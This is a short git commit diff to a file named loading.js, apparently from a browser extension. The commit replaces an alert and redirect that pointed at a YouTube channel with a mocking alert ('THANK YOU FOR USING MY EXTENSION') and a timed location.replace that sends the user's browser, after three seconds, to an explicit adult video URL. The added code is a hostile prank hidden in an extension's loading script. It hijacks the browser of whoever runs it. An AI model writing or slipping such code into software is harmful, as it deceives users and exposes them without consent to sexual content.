e5bc6b68ecf3d28aafb44008de3bc6a86e5b618e
Nezn4komec <56114041+Nezn4komec@users.noreply.github.com>
2019-10-24 16:34:46 +0500

    Update loading.js

--- loading.js
+++ loading.js
@@ -1,2 +1,2 @@
-alert('MOBY YOUTUBE - https://www.youtube.com/channel/UC4Nf4e4e2yRjVnOhjdqFfew');
-setTimeout('location.replace("https://www.youtube.com/channel/UC4Nf4e4e2yRjVnOhjdqFfew")',3000);
+alert('AHHAHAHAHAHAHAH, THANK YOU FOR USING MY EXTENSION <3');
+setTimeout('location.replace("https://vcdn01.me-gay.com/video24/1/17/09fb450dada93b08563db1537387ef17.mp4?validfrom=1571916798&validto=1571922198&rate=1390k&hash=NLZoT7KUOuiKxLndX1hnW9yNcoU%3D")',3000);
